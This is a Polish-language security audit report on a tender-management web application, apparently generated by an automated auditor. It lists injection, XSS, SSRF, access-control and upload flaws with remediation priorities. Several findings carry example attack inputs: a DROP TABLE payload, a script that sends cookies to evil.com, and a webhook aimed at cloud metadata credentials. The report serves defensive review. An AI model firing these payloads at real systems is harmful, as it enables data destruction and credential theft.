# 🔴 AUDYT BEZPIECZEŃSTWA — Injection & Input Validation
## Yuna Bud-OS (Terra-OS)
### Data: 2026-07-17 | Audytor: Hermes Agent

---

## PODSUMOWANIE KRYTYCZNE

| Kategoria | Krytyczne | Wysokie | Średnie | Niskie |
|-----------|:---------:|:-------:|:-------:|:------:|
| SQL Injection | 1 | 4 | 3 | 0 |
| XSS | 1 | 1 | 1 | 0 |
| Command Injection | 0 | 0 | 1 | 0 |
| SSRF | 1 | 1 | 0 | 0 |
| Mass Assignment | 0 | 3 | 2 | 0 |
| Path Traversal | 0 | 1 | 0 | 0 |
| Deserialization | 0 | 0 | 1 | 0 |
| Broken Access Control | 0 | 2 | 1 | 0 |
| **RAZEM** | **3** | **12** | **9** | **0** |

---

## 1. SQL INJECTION

### 🔴 KRYTYCZNE: SQL Injection via `model_dump()` — dynamiczne nazwy kolumn

**Plik:** `services/api/services/api/routers/tender_alerts.py:342-344`
**Opis:** Klucze z `body.model_dump(exclude_none=True)` są interpolowane bezpośrednio do SQL jako nazwy kolumn BEZ walidacji allowlistu.

```python
set_parts = ", ".join([f"{k} = :{k}" for k in updates])
updates["id"] = str(alert_id)
db.execute(text(f"UPDATE tender_alert SET {set_parts} WHERE id = :id"), updates)
```

**Atak:** Pydantic `model_dump()` zwraca klucze zdefiniowane w modelu, ALE jeśli model używa `extra = "allow"` lub atakujący podmieni request body:
```json
{"name; DROP TABLE tender_alert; --": "pwned"}
```
**Ocena:** Jeśli Pydantic `AlertUpdate` ma `model_config = ConfigDict(extra="allow")`, jest to **pełna SQL injection**. Nawet bez tego — nazwy pól modelu NIE są sanityzowane pod kątem znaków specjalnych SQL.

**Dotyczy również:**
- `services/api/services/api/routers/competitor_watch.py:195-198`
- `services/api/services/api/routers/offers.py:275`
- `services/api/services/api/routers/automations.py:127-131`
- `services/api/services/api/routers/buyer_crm.py:260`
- `services/api/services/api/routers/organizations.py:176`

---

### 🟠 WYSOKIE: SQL Injection via `len(cpv_prefix)` w f-stringu

**Plik:** `services/api/services/api/routers/market_intelligence.py:494`

```python
if cpv_prefix:
    cond_parts.append(f"left(cpv_code, {len(cpv_prefix)}) = :cpv")
    params["cpv"] = cpv_prefix
```

**Atak:** Wartość `len(cpv_prefix)` jest zawsze `int`, więc to nie jest klasyczny injection. JEDNAK — brak walidacji `cpv_prefix` pozwala na wysłanie np. 1000-znakowego stringa, powodując pełny skan tabeli (DoS):
```
GET /api/v2/intelligence/summary?cpv_prefix=AAAA...x1000
```
**Severity:** Średnie (DoS, nie data exfiltration)

---

### 🟠 WYSOKIE: SSE Stream — interpolacja danych użytkownika do JSON

**Plik:** `services/api/services/api/routers/chat_ai.py:130-134`

```python
yield f'data: {{"type": "start", "q": "{q}"}}\n\n'
yield f'data: {{"type": "result", "answer": "Szukam przetargów dla: {q}"}}\n\n'
```

**Atak:** Parametr `q` jest wstawiany bezpośrednio do stringa JSON bez escapowania. Atakujący może wstrzyknąć dowolny JSON:
```
GET /api/v2/chat/stream?q="},"type":"admin","escalate":true,"q":"
```
To łamie strukturę SSE JSON, potencjalnie powodując XSS u klienta parsującego te dane.

---

### 🟠 WYSOKIE: Brak tenant isolation w endpointach zasobów

**Plik:** `services/api/services/api/routers/resources.py:118-124`

```python
@sub_router.get("/{sub_id}")
def get_subcontractor(sub_id: str, user: AuthUser) -> dict:
    ...
    row = conn.execute(
        sa.text("SELECT * FROM subcontractors WHERE id = :id"), {"id": sub_id}
    ).fetchone()
```

**Atak:** BRAK filtra `org_id = :org_id` — dowolny zalogowany użytkownik może odczytać dane podwykonawcy INNEGO tenanta:
```
GET /api/v1/subcontractors/{uuid-innego-tenanta}
```

**Dotyczy również:**
- `resources.py:140-145` (DELETE subcontractor — bez tenant check!)
- `resources.py:285-290` (DELETE equipment — bez tenant check!)
- `resources.py:149-161` (tender_subcontractors — bez tenant check)

---

### 🟠 WYSOKIE: IDOR — DELETE bez autoryzacji tenant

**Plik:** `services/api/services/api/routers/resources.py:140-145`

```python
@sub_router.delete("/{sub_id}")
def delete_subcontractor(sub_id: str, user: AuthUser) -> dict:
    engine = get_engine()
    with engine.connect() as conn:
        conn.execute(sa.text("DELETE FROM subcontractors WHERE id = :id"), {"id": sub_id})
```

**Atak:** Dowolny zalogowany użytkownik może usunąć DOWOLNEGO podwykonawcę z systemu:
```
DELETE /api/v1/subcontractors/uuid-dowolnego-podwykonawcy
```
**Severity:** Wysokie — destrukcja danych między tenantami

---

### 🟡 ŚREDNIE: Dynamiczny SQL w `estimates_v2.py` — kontrolowany allowlist

**Plik:** `services/api/services/api/routers/estimates_v2.py:417-430`

```python
UPDATABLE = {"description", "unit", "quantity", "unit_price", ...}
field_updates = [f"{f} = :{f}" for f in UPDATABLE if f in line]
```

**Ocena:** Allowlist `UPDATABLE` ogranicza pola, ale dane przychodzą z `lines: list[dict]` — surowego dict'a bez walidacji Pydantic. Atakujący kontroluje strukturę `line`.

---

## 2. XSS (Cross-Site Scripting)

### 🔴 KRYTYCZNE: Stored XSS via `dangerouslySetInnerHTML` z danymi z bazy

**Plik:** `apps/ui/src/components/TenderFTSSearch.tsx:92`

```tsx
<span dangerouslySetInnerHTML={{ __html: r.headline }} />
```

**Atak:** Pole `headline` pochodzi z PostgreSQL `ts_headline()` który otacza dopasowania tagami `<b>`. ALE jeśli dane źródłowe (tytuł przetargu) zawierają XSS payload, `ts_headline` NIE sanityzuje HTML:
```
Tytuł przetargu: <img src=x onerror=alert(document.cookie)>Budowa drogi
```
Po FTS: `<b>&lt;img...</b>` — ALE PostgreSQL `ts_headline` z `HighlightAll=true` może przepuścić tagi.

**Payload:**
```
POST tender z title: <script>fetch('https://evil.com/'+document.cookie)</script>
```

---

### 🟠 WYSOKIE: Reflected XSS via SSE stream

**Plik:** `services/api/services/api/routers/chat_ai.py:130-134`

```python
yield f'data: {{"type": "result", "answer": "Szukam przetargów dla: {q}"}}\n\n'
```

Klient parsuje SSE i prawdopodobnie renderuje `answer` w DOM. Payload:
```
GET /api/v2/chat/stream?q=<img/src=x onerror=alert(1)>
```

---

### 🟡 ŚREDNIE: `dangerouslySetInnerHTML` z renderMarkdown

**Plik:** `apps/ui/src/components/pages/DecyzjaPage.tsx:749`

```tsx
dangerouslySetInnerHTML={{ __html: renderMarkdown(brief) }}
```

**Ryzyko:** Zależy od implementacji `renderMarkdown()`. Jeśli nie sanityzuje wyjścia (np. brak DOMPurify), markdown z danymi z API może zawierać XSS:
```markdown
[Click me](javascript:alert(1))
```

---

## 3. SSRF (Server-Side Request Forgery)

### 🔴 KRYTYCZNE: SSRF via BZP orderLink → Jina Reader

**Plik:** `services/api/services/api/routers/bzp.py:306-311`

```python
bzp_url = item.get("orderLink") or item.get("internetAddress") or ""
if bzp_url:
    jina_url = f"https://r.jina.ai/{bzp_url}"
    jr = httpx.get(jina_url, timeout=15, headers={"Accept": "text/plain"})
```

**Atak:** Dane z BZP API mogą zawierać sfabrykowane URL-e. Choć przechodzi przez Jina, serwer wykonuje HTTP request do URL kontrolowanego potencjalnie przez atakującego (jeśli kontroluje dane w BZP). BRAK allowlisty domen.

---

### 🟠 WYSOKIE: SSRF via webhook dispatch

**Plik:** `services/api/services/api/routers/automations.py:394-417`

```python
async def _dispatch_webhooks(tenant_id: str, event: str, payload: dict) -> None:
    ...
    for wh in rows:
        resp = await client.post(wh.url, json=payload, headers=headers)
```

**Atak:** Użytkownik rejestruje webhook z URL `http://169.254.169.254/latest/meta-data/` (AWS metadata) lub `http://localhost:6379/` (Redis). System wykonuje POST do tego URL-a z danymi.
```json
POST /api/v2/automations/webhooks
{"name": "test", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "events": ["tender.created"]}
```

**Brak:** Walidacji prywatnych IP, allowlisty domen, filtracji SSRF.

---

## 4. COMMAND INJECTION

### 🟡 ŚREDNIE: Subprocess z hardcoded paths — bezpieczne, ale ryzykowne wzorce

**Plik:** `services/api/services/api/tasks.py:173-201`

```python
result = subprocess.run(
    ['/home/ubuntu/terra-os/.venv/bin/python3.12', '/home/ubuntu/terra-os/scripts/uzp_tracker.py'],
    capture_output=True, text=True, timeout=300
)
```

**Ocena:** Ścieżki są hardcoded (nie z user input) → brak bezpośredniego injection. ALE:
- Brak `env` parametru — dziedziczy środowisko procesu
- Stdout jest zwracany do callera (potencjalny information disclosure)
- Użycie list (nie shell=True) jest poprawne

**Severity:** Niskie-Średnie (design risk, nie exploitable bezpośrednio)

---

## 5. PATH TRAVERSAL

### 🟠 WYSOKIE: Upload bez walidacji filename

**Plik:** `services/api/services/api/routers/multimodal.py:37-68`

```python
@router.post("/upload")
async def upload_document(
    file: UploadFile = File(...),
    tender_id: Optional[str] = None,
):
    if not file.filename or not file.filename.lower().endswith('.pdf'):
        raise HTTPException(400, "Only PDF files are supported")

    doc_id = str(uuid.uuid4())
    file_path = UPLOAD_DIR / f"{doc_id}.pdf"
```

**Ocena:** Plik jest zapisywany pod UUID — to jest **bezpieczne** (brak path traversal w nazwie pliku). ALE:
- `file.filename` (oryginalna nazwa) jest zapisywana w bazie bez sanityzacji
- Brak sprawdzenia MIME type (tylko extension check)
- Magic bytes nie są weryfikowane — atakujący może uploadować złośliwy plik z rozszerzeniem `.pdf`

**Wektor:** Fake PDF z embedded JavaScript/malware, zapisany w systemie.

---

## 6. DESERIALIZATION

### 🟡 ŚREDNIE: pickle w skrypcie treningowym

**Plik:** `scripts/retrain_cost_estimator.py:204`

```python
pickle.dump(result, f)
```

**Ocena:** Skrypt offline (nie webowy endpoint), ale wynik jest później ładowany. Jeśli atakujący podmieni plik modelu, pickle deserializacja = RCE.

---

## 7. MASS ASSIGNMENT / OVER-POSTING

### 🟠 WYSOKIE: Patch estimate lines — brak walidacji typów

**Plik:** `services/api/services/api/routers/estimates_v2.py:343-434`

```python
@router.patch("/{estimate_id}/lines")
def patch_estimate_lines(
    estimate_id: str,
    lines: list[dict],  # ← RAW DICT, nie Pydantic model!
    user: AuthUser,
):
```

**Atak:** Endpoint przyjmuje `list[dict]` zamiast Pydantic schema. Atakujący może wstrzyknąć pola spoza allowlistu `UPDATABLE`:
```json
[{"id": "xxx", "tenant_id": "inny-tenant", "estimate_id": "inny-estimate"}]
```
Wprawdzie allowlist `UPDATABLE` filtruje pola do UPDATE, ALE wstawianie nowych linii (linia 383-405) nie waliduje typów — `line.get("quantity")` może być stringiem, obiektem, etc.

---

### 🟠 WYSOKIE: `body: dict` bez schema w generate-kosztorys

**Plik:** `services/api/services/api/routers/chat_ai.py:110`

```python
@router.post('/generate-kosztorys')
def generate_kosztorys(body: dict, user: AuthUser, db: DB):
    tender_id = body.get('tender_id')
```

**Atak:** Brak walidacji Pydantic — `tender_id` nie jest walidowane. Można wysłać dowolny obiekt. Choć wartości przechodzą przez parametryzowane query, brak type checking = defensive depth violation.

---

### 🟠 WYSOKIE: Webhook update — pola modelu bezpośrednio do SQL

**Plik:** `services/api/services/api/routers/automations.py:124-134`

```python
updates = {k: v for k, v in body.model_dump().items() if v is not None}
set_clause = ", ".join(f"{k} = :{k}" for k in updates)
conn.execute(sa.text(f"""
    UPDATE automation_webhook SET {set_clause}
    WHERE id = :wid AND tenant_id = :tid
"""), updates)
```

**Ryzyko:** Jeśli model `WebhookUpdate` zawiera pole `tenant_id`, atakujący mógłby zmienić tenant ownership webhooka. Wymaga analizy modelu.

---

## 8. BROKEN ACCESS CONTROL (powiązane z injection)

### 🟠 WYSOKIE: Equipment listing bez tenant filter

**Plik:** `services/api/services/api/routers/resources.py:216-255`

```python
@equip_router.get("")
def list_equipment(
    user: AuthUser,
    status: str | None = Query(None),
    ...
):
    filters = []
    # BRAK: filters.append("org_id = :org_id")
```

**Atak:** Endpoint nie filtruje po `org_id` — WSZYSCY użytkownicy widzą CAŁY sprzęt w systemie!

---

### 🟠 WYSOKIE: Document upload bez autentykacji

**Plik:** `services/api/services/api/routers/multimodal.py:37-38`

```python
@router.post("/upload")
async def upload_document(
    file: UploadFile = File(...),
    tender_id: Optional[str] = None,
):  # BRAK: user: AuthUser !!
```

**Atak:** Endpoint `POST /api/v2/documents/upload` nie wymaga autentykacji! Dowolny klient może uploadować pliki:
```bash
curl -F "file=@malicious.pdf" https://target.com/api/v2/documents/upload
```

---

## 9. TEMPLATE INJECTION

### 🟡 ŚREDNIE: Jinja2 z `StrictUndefined` — ograniczone ryzyko

**Plik:** `services/api/services/api/intelligence/document_generator.py:191-197`

```python
env = Environment(
    loader=FileSystemLoader(str(TEMPLATES_DIR)),
    undefined=StrictUndefined,
    trim_blocks=True,
    lstrip_blocks=True,
)
```

**Ocena:** Szablony ładowane z filesystemu (nie z user input). `StrictUndefined` jest ochroną. ALE: jeśli dane kontekstowe (`ctx`) zawierają niesanityzowane user input, a szablony renderują je bez autoescaping — ryzyko injection. **Brak `autoescape=True`** — potencjalny XSS w generowanych dokumentach HTML/PDF.

---

## 10. DODATKOWE OBSERWACJE

### Brak Rate Limiting na krytycznych endpointach
- `/api/v2/chat/stream` — SSE bez throttle = resource exhaustion
- `/api/v2/documents/upload` — nieuwierzytelniony upload = storage DoS

### Information Disclosure
- `tasks.py:178` — stdout subprocessu zwracany do Celery result (może zawierać secrets)
- `tender_alerts.py:414` — pełny exception w odpowiedzi HTTP 500: `f"Błąd wykonania zapytania: {e}"`

### Brak CSRF Protection
- Wszystkie mutujące endpointy (POST/PUT/DELETE) polegają wyłącznie na Bearer token
- Jeśli token jest w cookie bez SameSite=Strict, CSRF jest możliwy

---

## REKOMENDACJE NAPRAWCZE (PRIORYTET)

### P0 — Natychmiast (< 24h)
1. **Dodać tenant isolation** do `resources.py` (GET/DELETE subcontractor, equipment)
2. **Dodać `user: AuthUser`** do `multimodal.py:upload_document`
3. **Dodać URL allowlist/blocklist** do `_dispatch_webhooks` (blokada prywatnych IP)
4. **Sanityzować `r.headline`** w `TenderFTSSearch.tsx` z DOMPurify

### P1 — Pilne (< 1 tydzień)
5. **Zdefiniować explicit allowlist** nazw kolumn we WSZYSTKICH dynamicznych UPDATE (zamiast polegać na Pydantic model keys)
6. **Zamienić `body: dict`** na Pydantic schema w `chat_ai.py:generate_kosztorys`
7. **Escapować `q`** w SSE stream (`chat_ai.py:130-134`) — użyć `json.dumps()`
8. **Dodać `autoescape=True`** do Jinja2 Environment w `document_generator.py`

### P2 — Ważne (< 1 miesiąc)
9. Walidacja MIME type (magic bytes) przy uploadzie
10. Rate limiting na SSE i upload endpointach
11. Usunąć exception details z HTTP 500 responses
12. Zamienić `list[dict]` na `list[PydanticModel]` w `estimates_v2.py:patch_estimate_lines`

---

*Raport wygenerowany automatycznie. Wymaga manualnej weryfikacji exploitability każdego finding'u w kontekście deploymentu produkcyjnego.*
